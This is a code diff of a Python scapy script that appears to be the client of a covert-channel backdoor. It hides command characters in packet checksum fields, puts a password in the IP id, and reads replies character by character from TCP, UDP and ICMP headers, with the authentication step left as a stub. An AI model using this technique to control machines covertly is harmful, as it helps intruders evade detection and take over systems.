@@ -49,9 +49,9 @@ def sendCommand(command):
 		elif protocol == 'icmp':
 			proto = ICMP(chksum=ord(c))
 		packet = packet/proto
-		send(packet)
+		send(packet, verbose=0)
 
-	send(IP(dst=server, id=pswd)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15))
+	send(IP(dst=server, id=pswd)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15), verbose=0)
 
 
 def recvThread():
@@ -66,7 +66,7 @@ def recvThread():
 		(header, packet) = cap.next()
 		packetHandler(packet)
 
-def authenticated():
+def authenticated(packet):
 	# start a timer, or check if it's running
 		# if the timer expired, no auth
 	# if it fits the knock code, add one to a value
@@ -77,7 +77,23 @@ def packetHandler(packet):
 	if authenticated(packet):
 		pacType = utils.checkType(packet)
 		ip, protoH, data = utils.stripPacket(packet, pacType)
-		checkCommand(ip, protoH, data, pacType)
+		checkResult(ip, protoH, data, pacType)
+
+def checkResult(ip, proto, data, pacType):
+	global results
+	character = ''
+
+	if pacType == 'tcp':
+		character = proto[2]
+	elif pacType == 'udp':
+		character = proto[6]
+	elif pacType == 'icmp':
+		character = proto[2]
+
+	# here is where I'll actually be printing the results
+	if character < 256:
+		if character != 15:
+			sys.stdout.write(chr(character)) 
 
 def getCommand():
 	try: 
